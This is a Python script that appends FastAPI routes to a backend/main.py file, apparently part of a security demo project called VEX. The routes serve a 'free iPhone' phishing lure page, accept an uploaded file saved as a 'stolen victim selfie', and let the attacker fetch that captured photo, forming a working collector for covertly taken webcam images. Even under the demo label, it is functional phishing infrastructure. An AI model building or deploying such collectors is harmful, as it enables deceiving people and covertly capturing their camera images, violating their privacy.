# Python script to add /phish/iphone and /api/phish/upload to backend/main.py
import os

routes_code = '''
# ==============================================================================
# CAMPHISH "FREE IPHONE" DEMO & ATTACKER COLLECTOR ENDPOINTS
# ==============================================================================
@app.get("/phish/iphone")
def phish_iphone_page():
    phish_file = Path(__file__).parent / "dashboard" / "free_iphone_phish.html"
    return FileResponse(phish_file)

@app.post("/api/phish/upload")
async def receive_phish_upload(request: Request):
    stolen_path = Path(__file__).parent / "dashboard" / "stolen_victim_selfie.jpg"
    try:
        form = await request.form()
        uploaded = form.get("file")
        if uploaded:
            content = await uploaded.read()
            with open(stolen_path, "wb") as f:
                f.write(content)
            return {"status": "SUCCESS", "saved_bytes": len(content)}
    except Exception as e:
        return {"status": "ERROR", "error": str(e)}
    return {"status": "EMPTY"}

@app.get("/api/hacker/latest_stolen_photo")
def get_hacker_stolen_photo():
    stolen_path = Path(__file__).parent / "dashboard" / "stolen_victim_selfie.jpg"
    if stolen_path.exists():
        return FileResponse(stolen_path, media_type="image/jpeg")
    # Return default honeypot selfie if not yet captured
    return FileResponse(Path(__file__).parent / "dashboard" / "index.html")
'''

for base_dir in [r'C:\vex\backend', r'c:\Users\HP\Downloads\VEX-master\backend']:
    main_py = os.path.join(base_dir, 'main.py')
    if os.path.exists(main_py):
        with open(main_py, 'r', encoding='utf-8') as f:
            code = f.read()
        if '/phish/iphone' not in code:
            with open(main_py, 'a', encoding='utf-8') as f:
                f.write('\n' + routes_code)
            print(f"[+] Added phish routes to {main_py}")
        else:
            print(f"[=] Phish routes already in {main_py}")
